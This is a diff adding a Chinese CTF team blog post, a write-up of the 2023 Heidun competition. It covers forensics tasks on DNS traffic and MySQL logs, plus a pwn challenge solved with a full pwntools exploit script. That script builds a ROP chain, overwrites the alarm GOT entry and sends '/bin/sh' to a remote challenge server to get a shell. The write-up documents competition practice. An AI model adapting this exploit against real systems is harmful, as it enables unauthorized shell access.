@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 5.4.2">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/hackerone-32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/hackerone-16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="msvalidate.01" content="237E6FD4C952815B9A0DDB67FAB1FF12">
+  <meta name="baidu-site-verification" content="code-LhZrqnckkC">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"r30blogs.com","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.12.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="MISCdns流量 注意data数据发现是压缩包的16进制，导出 504b03041400090008003c1bee5204212ed6340000002600000008000000666c61672e747874c6060a3144f6c49c5bc8305e76f334670b51c53ce58ff0eb452daa8cc6307fa2e2e4fad9c62587a0a6e29c0e30e">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023黑盾">
+<meta property="og:url" content="https://r30blogs.com/2023/06/05/2023%E9%BB%91%E7%9B%BE/index.html">
+<meta property="og:site_name" content="R3ape1团队笔记">
+<meta property="og:description" content="MISCdns流量 注意data数据发现是压缩包的16进制，导出 504b03041400090008003c1bee5204212ed6340000002600000008000000666c61672e747874c6060a3144f6c49c5bc8305e76f334670b51c53ce58ff0eb452daa8cc6307fa2e2e4fad9c62587a0a6e29c0e30e">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055365.gif">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055373.gif">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055378.gif">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055381.gif">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055380.jpg">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055382.jpg">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055709.gif">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055747.jpg">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055778.gif">
+<meta property="article:published_time" content="2023-06-05T12:57:00.000Z">
+<meta property="article:modified_time" content="2023-06-05T12:58:12.834Z">
+<meta property="article:author" content="nnnpc、commit、Eureka">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="misc">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055365.gif">
+
+
+<link rel="canonical" href="https://r30blogs.com/2023/06/05/2023%E9%BB%91%E7%9B%BE/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://r30blogs.com/2023/06/05/2023%E9%BB%91%E7%9B%BE/","path":"2023/06/05/2023黑盾/","title":"2023黑盾"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>2023黑盾 | R3ape1团队笔记</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">R3ape1团队笔记</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">杭电信工笃行楼230实验室</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number">1.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#dns%E6%B5%81%E9%87%8F"><span class="nav-number">1.1.</span> <span class="nav-text">dns流量</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mylog"><span class="nav-number">1.2.</span> <span class="nav-text">mylog</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PWN"><span class="nav-number">2.</span> <span class="nav-text">PWN</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="nnnpc、commit、Eureka"
+      src="/images/head.png">
+  <p class="site-author-name" itemprop="name">nnnpc、commit、Eureka</p>
+  <div class="site-description" itemprop="description">网络信息安全，责任重大，使命光荣。</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="mailto:1695672857@qq.com" title="E-Mail → mailto:1695672857@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://r30blogs.com/2023/06/05/2023%E9%BB%91%E7%9B%BE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.png">
+      <meta itemprop="name" content="nnnpc、commit、Eureka">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="R3ape1团队笔记">
+      <meta itemprop="description" content="网络信息安全，责任重大，使命光荣。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="2023黑盾 | R3ape1团队笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2023黑盾
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-06-05 20:57:00 / 修改时间：20:58:12" itemprop="dateCreated datePublished" datetime="2023-06-05T20:57:00+08:00">2023-06-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">比赛</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="dns流量"><a href="#dns流量" class="headerlink" title="dns流量"></a>dns流量</h2><p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055365.gif" alt="图片"></p>
+<p>注意data数据发现是压缩包的16进制，导出</p>
+<p><code>504b03041400090008003c1bee5204212ed6340000002600000008000000666c61672e747874c6060a3144f6c49c5bc8305e76f334670b51c53ce58ff0eb452daa8cc6307fa2e2e4fad9c62587a0a6e29c0e30e71dc6505d2c24504b070804212ed63400000026000000504b01021f001400090008003c1bee5204212ed63400000026000000080024000000000000002000000000000000666c61672e7478740a002000000000000100180056f63fe71c78d70156f63fe71c78d7016bd2d4340e78d701504b050600000000010001005a0000006a000000000</code></p>
+<p>010导入16进制数据，winrar修复压缩包得到加密flag文件</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055373.gif" alt="图片"></p>
+<p>爆破密码</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055378.gif" alt="图片"></p>
+<p>解压得到flag，<strong>flag{496d8981f449e45f6e39e1faa0b1ab8a}</strong></p>
+<h2 id="mylog"><a href="#mylog" class="headerlink" title="mylog"></a>mylog</h2><p>命令将mysql日志文件转换为sql文件</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055381.gif" alt="图片"></p>
+<p>mysql使用source命令导入1.sql</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055380.jpg" alt="图片"></p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055382.jpg" alt="图片"></p>
+<p>在黑盾库中找到flag表，得到flag</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055709.gif" alt="图片"></p>
+<p>flag{heidun-2023-heidun}</p>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><p>伪随机数，覆盖种子为0，然后动调出密文，最后打ret2dlresolve</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055747.jpg" alt="图片"></p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055778.gif" alt="图片"></p>
+<p><strong>EXP:</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">io = remote(<span class="string">&#x27;39.104.19.209&#x27;</span>,<span class="number">16519</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">sd    = <span class="keyword">lambda</span> data        :io.send(data) </span><br><span class="line">sa    = <span class="keyword">lambda</span> delim,data     :io.sendafter(delim, data)</span><br><span class="line">sl    = <span class="keyword">lambda</span> data        :io.sendline(data)</span><br><span class="line">sla   = <span class="keyword">lambda</span> delim,data     :io.sendlineafter(delim, data)</span><br><span class="line">sda   = <span class="keyword">lambda</span> delim,data     :io.sendafter(delim, data)</span><br><span class="line">rcn   = <span class="keyword">lambda</span> numb=<span class="number">4096</span>      :io.recv(numb, timeout = <span class="number">3</span>)</span><br><span class="line">rl    = <span class="keyword">lambda</span>           :io.recvline()</span><br><span class="line">ru    = <span class="keyword">lambda</span> delims       :io.recvuntil(delims)</span><br><span class="line">uu32   = <span class="keyword">lambda</span> data        :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64   = <span class="keyword">lambda</span> data        :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">li    = <span class="keyword">lambda</span> tag, addr      :log.info(tag + <span class="string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line">ls    = <span class="keyword">lambda</span> tag, addr      :log.success(tag + <span class="string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line">lsh   = <span class="keyword">lambda</span> tag, addr      :LibcSearcher(tag, addr)</span><br><span class="line">interactive = <span class="keyword">lambda</span>         :io.interactive()</span><br><span class="line">printf  = <span class="keyword">lambda</span> index        :success(<span class="built_in">hex</span>(index))</span><br><span class="line">getadd  = <span class="keyword">lambda</span>           :u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#123;&gt;o&lt;fi:`mjkj5daqd6fhugim~~rj5h=&#x27;</span> + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">sd(payload)</span><br><span class="line">rdi = <span class="number">0x400af3</span></span><br><span class="line">ret = <span class="number">0x400691</span></span><br><span class="line">r15 = <span class="number">0x400af1</span></span><br><span class="line">buf = elf.bss() + <span class="number">0x100</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(r15) + p64(elf.got[<span class="string">&#x27;alarm&#x27;</span>])*<span class="number">2</span> + p64(elf.sym[<span class="string">&#x27;read&#x27;</span>]) + p64(r15) + p64(buf)*<span class="number">2</span> + p64(elf.sym[<span class="string">&#x27;read&#x27;</span>]) + p64(<span class="number">0x400AEA</span>) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(elf.got[<span class="string">&#x27;alarm&#x27;</span>]) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(buf) + p64(<span class="number">0x400AD0</span>)</span><br><span class="line">sd(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sd(<span class="string">b&#x27;\xf5&#x27;</span>)</span><br><span class="line">sd(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x3b</span>, <span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">interactive()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
+              <a href="/tags/misc/" rel="tag"><i class="fa fa-tag"></i> misc</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/06/05/2023%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A8/" rel="prev" title="2023磐石行动">
+                  <i class="fa fa-chevron-left"></i> 2023磐石行动
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/06/05/LitCTF/" rel="next" title="LitCTF">
+                  LitCTF <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">浙ICP备2022023783号-1 </a>
+  </div>
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">nnnpc、commit、Eureka</span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.5.0/pjax.min.js" integrity="sha256-3NkoLDrmHLTYj7csHIZSr0MHAFTXth7Ua/DDt4MRUAg=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/pjax.js"></script>
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.0/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
